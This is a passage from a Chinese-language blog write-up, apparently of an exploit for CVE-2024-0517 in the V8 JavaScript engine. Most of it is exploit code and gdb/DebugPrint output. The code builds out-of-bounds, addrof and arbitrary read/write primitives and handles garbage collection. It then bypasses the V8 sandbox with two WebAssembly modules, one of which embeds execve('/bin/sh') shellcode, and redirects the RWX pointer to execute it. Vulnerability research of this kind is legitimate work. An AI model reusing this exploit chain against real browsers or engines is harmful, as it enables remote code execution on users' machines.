class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">----------代码运行结果--------------</span><br><span class="line">DebugPrint: 0x3d0b0030ae8d: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x3d0b0018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d0b0030ae7d &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 65536</span><br><span class="line"> - properties: 0x3d0b000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3d0b00000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d0b00025d29 &lt;AccessorInfo name= 0x3d0b00000cf1 &lt;String[6]: #length&gt;, data= 0x3d0b00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d0b0030ae7d &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">0x3d0b0018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3d0b0018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3d0b000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x3d0b0018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x3d0b0018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3d0b00000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3d0b0018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3d0b0018e56d &lt;JSFunction Array (sfi = 0x3d0b001c6155)&gt;</span><br><span class="line"> - dependent code: 0x3d0b000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x3d0b0030aee5: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x3d0b0018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d0b0030af69 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d0b000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3d0b00000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d0b00025d29 &lt;AccessorInfo name= 0x3d0b00000cf1 &lt;String[6]: #length&gt;, data= 0x3d0b00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d0b0030af69 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">         1-2: 2.2</span><br><span class="line"> &#125;</span><br><span class="line">0x3d0b0018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3d0b0018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3d0b000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x3d0b0018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x3d0b0018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3d0b00000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3d0b0018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3d0b0018e56d &lt;JSFunction Array (sfi = 0x3d0b001c6155)&gt;</span><br><span class="line"> - dependent code: 0x3d0b000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">mark is ==&gt;  13</span><br><span class="line">a [mark] is ==&gt;  60030af69</span><br><span class="line">a[2] is ==&gt;  200000030ae7d</span><br><span class="line"></span><br><span class="line">--------------gdb查看----------------</span><br><span class="line">pwndbg&gt; x/40wx 0x3d0b0030ae7d-1</span><br><span class="line">0x3d0b0030ae7c: 0x00000829      0x00000002         0x0030aee5      0x3ff19999 <span class="comment"># 0</span></span><br><span class="line">0x3d0b0030ae8c: 0x0018ee25      0x000006a5 <span class="comment"># 1     0x0030ae7d      0x00020000 # 2</span></span><br><span class="line">0x3d0b0030ae9c: 0x001a3049      0x001a3049 <span class="comment"># 3     0x0018ee25      0x000006a5 # 4</span></span><br><span class="line">0x3d0b0030aeac: 0x0030af49      0x00000006 <span class="comment"># 5     0x00001495      0x0030aea5 # 6</span></span><br><span class="line">0x3d0b0030aebc: 0x00000000      0x000006b5 <span class="comment"># 7     0x00000001      0x00000001 # 8</span></span><br><span class="line">0x3d0b0030aecc: 0x0030a801      0x0030a6b1 <span class="comment"># 9     0x000006a5      0x0030af89 # 10</span></span><br><span class="line">0x3d0b0030aedc: 0x0030afdd      0x0030afed <span class="comment"># 11    0x0018ee25      0x000006a5 # 12</span></span><br><span class="line">0x3d0b0030aeec: 0x0030af69      0x00000006 <span class="comment"># 13    0x00000565      0x00000026</span></span><br><span class="line">0x3d0b0030aefc: 0x000006c1      0x00000061      0x000006c1      0x000006c1</span><br><span class="line">0x3d0b0030af0c: 0x000006c1      0x000006c1      0x000006c1      0x000006c1</span><br></pre></td></tr></table></figure><p>我们可以数一下rwarr数组的elements距离起始位置的偏移刚好是我们所计算的mark值是一样的，因此我们可以通过此方式来获取和修改<code>rwarr</code>数组elements所指向的区域。</p><p>下面是实现该功能的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    b64[<span class="number">0</span>] = <span class="number">0n</span>;</span><br><span class="line">    f64[<span class="number">0</span>] = a[mark];</span><br><span class="line">    <span class="keyword">if</span> (u32[<span class="number">0</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">1</span>] = where - <span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (u32[<span class="number">1</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">0</span>] = where-<span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">      rwarr[<span class="number">0</span>] = what;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="获取GC抗性"><a href="#获取GC抗性" class="headerlink" title="获取GC抗性"></a>获取GC抗性</h4><p>由于V8垃圾回收机制的存在，我们需要分配若干对象并利用垃圾回收机制将其迁移至老生代内存空间，随后使用初始原语对这些对象进行篡改，并最后将保留在新生代的对象进行修复。</p><p>下面是完成该步骤的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> changer = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> leaker  = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> holder  = &#123;<span class="attr">p1</span>:<span class="number">0x1</span>, <span class="attr">p2</span>: <span class="number">0x1</span>, <span class="attr">p3</span>:<span class="number">0x1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer_addr = <span class="title function_">addrof_tmp</span>(changer);</span><br><span class="line"><span class="keyword">let</span> leaker_addr = <span class="title function_">addrof_tmp</span>(leaker);</span><br><span class="line"><span class="keyword">let</span> holder_addr = <span class="title function_">addrof_tmp</span>(holder);</span><br><span class="line">u32[<span class="number">0</span>] = holder_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">let</span> holder_addr_64 = f64[<span class="number">0</span>];</span><br><span class="line">u32[<span class="number">0</span>] = leaker_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(changer_addr + <span class="number">0x8</span>, f64[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// %DebugPrint(changer);</span></span><br><span class="line"><span class="title function_">write</span>(leaker_addr + <span class="number">0x8</span>, holder_addr_64);</span><br><span class="line"><span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">x.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">rwarr.<span class="property">length</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里就是获取GC对抗的代码，下面我们就可以开始书写真正的读写原语了。</p><h3 id="最终OOB"><a href="#最终OOB" class="headerlink" title="最终OOB"></a>最终OOB</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    f64[<span class="number">0</span>] = leaker[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(value);</span><br><span class="line">    leaker[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    holder.<span class="property">p2</span> = obj;</span><br><span class="line">    <span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(holder);</span></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">1</span>];</span><br><span class="line">    holder.<span class="property">p2</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过V8沙箱"><a href="#绕过V8沙箱" class="headerlink" title="绕过V8沙箱"></a>绕过V8沙箱</h3><p>我们需要创建两个WASM实例来绕过V8沙箱，一个用于存储shellcode，另一个用于篡改指向shellcode的64位指针</p><p>首先我们来看第一段wasm实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_rwx_addr = <span class="title function_">v8h_read64</span>(shell_wasm_instance_addr + <span class="number">0x48n</span>);</span><br><span class="line"><span class="keyword">let</span> shell_func_code_addr = shell_wasm_rwx_addr + <span class="number">0xB40n</span>;</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = shell_func_code_addr + <span class="number">0x2Dn</span>;</span><br></pre></td></tr></table></figure><p>上述代码的0x48n是wasm段距离wasm实例开始的偏移，之后的0xB40n和0x2Dn则是通过调试得到的函数地址和shellcode起始地址，我们可以在gdb中查看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x27b04622e000 + 0xB40</span><br><span class="line">   0x27b04622eb40:      push   rbp</span><br><span class="line">   0x27b04622eb41:      mov    rbp,rsp</span><br><span class="line">   0x27b04622eb44:      push   0x8</span><br><span class="line">   0x27b04622eb46:      push   rsi</span><br><span class="line">   0x27b04622eb47:      sub    rsp,0x10</span><br><span class="line">   0x27b04622eb4e:      cmp    rsp,QWORD PTR [r13-0x60]</span><br><span class="line">   0x27b04622eb52:      jbe    0x27b04622ec1e</span><br><span class="line">   0x27b04622eb58:      vxorpd xmm0,xmm0,xmm0</span><br><span class="line">   0x27b04622eb5c:      mov    rax,QWORD PTR [rsi+0x27]</span><br><span class="line">   0x27b04622eb60:      shr    rax,0x18</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/10i 0x27b04622e000 + 0xB40 + 0x2d</span><br><span class="line">   0x27b04622eb6d:      push   0x3b</span><br><span class="line">   0x27b04622eb6f:      pop    rax</span><br><span class="line">   0x27b04622eb70:      nop</span><br><span class="line">   0x27b04622eb71:      nop</span><br><span class="line">   0x27b04622eb72:      nop</span><br><span class="line">   0x27b04622eb73:      jmp    0x27b04622eb80</span><br><span class="line">   0x27b04622eb75:      vmovq  xmm0,r10</span><br><span class="line">   0x27b04622eb7a:      vmovsd QWORD PTR [rax],xmm0</span><br><span class="line">   0x27b04622eb7e:      movabs r10,0xbeb5b0068732f68</span><br><span class="line">   0x27b04622eb88:      vmovq  xmm0,r10</span><br></pre></td></tr></table></figure><h4 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">124</span>,<span class="number">124</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">125</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">36</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">13</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">117</span>,</span><br><span class="line"><span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">3</span>,<span class="number">116</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">121</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">10</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">68</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">16</span>,<span class="number">195</span>,<span class="number">68</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,</span><br><span class="line"><span class="number">233</span>,<span class="number">67</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tbl = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Table</span>(&#123;</span><br><span class="line">    <span class="attr">initial</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="string">&quot;anyfunc&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> importObject = &#123;</span><br><span class="line">    <span class="attr">imports</span>: &#123; imported_func : <span class="function">(<span class="params">n</span>) =&gt;</span> n + <span class="number">1</span>, &#125;,</span><br><span class="line">    <span class="attr">js</span>: &#123; tbl &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, importObject);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmInstance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="keyword">let</span> RWX_page_pointer = <span class="title function_">v8h_read64</span>(wasmInstance_addr+<span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_make_array = wasmInstance.<span class="property">exports</span>.<span class="property">make_array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_main = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="title function_">wasm_write</span>(wasmInstance_addr+<span class="number">0x48n</span>, shell_code_addr);</span><br><span class="line"><span class="title function_">func_main</span>();</span><br></pre></td></tr></table></figure><h3 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h3><p><img src="/2025/01/18/CVE-2024-0517/image-20250217005255600.png" alt="image-20250217005255600"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 